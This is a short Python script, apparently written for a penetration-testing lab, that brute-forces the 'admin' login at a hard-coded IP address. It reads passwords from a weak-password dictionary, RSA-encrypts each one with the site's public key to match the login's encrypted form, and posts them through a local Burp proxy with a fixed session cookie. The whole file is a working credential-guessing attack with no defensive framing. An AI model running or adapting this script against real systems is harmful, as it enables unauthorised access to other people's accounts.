# -*- encoding: utf-8 -*-
# TODO:@ModuleName: RSA加密
# TODO:@Author: tomato
# TODO:@Version: Python3.12.0
# TODO:@Time: 2025/8/17 16:10

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
import base64
import requests
from urllib.parse import quote


def RSA_encrypt(public_key_pem, origin_data):
    """
    RSA加密
    :param public_key_pem:
    :param origin_data:
    :return: 加密后的密文
    """
    public_Key = RSA.import_key(public_key_pem)
    cipher = PKCS1_v1_5.new(public_Key)
    cipher_text = cipher.encrypt(origin_data)
    return base64.b64encode(cipher_text).decode("utf-8")


# 公钥
public_key = """-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDRvA7giwinEkaTYllDYCkzujvi
NH+up0XAKXQot8RixKGpB7nr8AdidEvuo+wVCxZwDK3hlcRGrrqt0Gxqwc11btlM
DSj92Mr3xSaJcshZU8kfj325L8DRh9jpruphHBfh955ihvbednGAvOHOrz3Qy3Cb
ocDbsNeCwNpRxwjIdQIDAQAB
-----END PUBLIC KEY-----"""

headers = {
    'Host': '121.43.105.51:82',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': '*/*',
    'Origin': 'http://121.43.105.51:82',
    'Referer': 'http://121.43.105.51:82/',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Cookie': 'PHPSESSID=9a1d6f53aeda109f7d75b9cb2f4615da',
}
# TODO: 配置转发到burp的代理
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}
# 明文数据
with open("弱口令字典.txt", "r", encoding="utf-8") as f:
    lines = f.readlines()
    for line in lines:
        password = line.strip()

        data = f'{{"username":"admin","password":"{password}"}}'.encode("utf-8")

        encrypted_data = f"data={quote(RSA_encrypt(public_key, data))}"
        # print(encrypted_data)
        response = requests.post('http://121.43.105.51:82/encrypt/rsa.php', headers=headers, data=encrypted_data,
                                 proxies=proxies)
        print(response.text.encode("utf-8").decode("unicode_escape"))
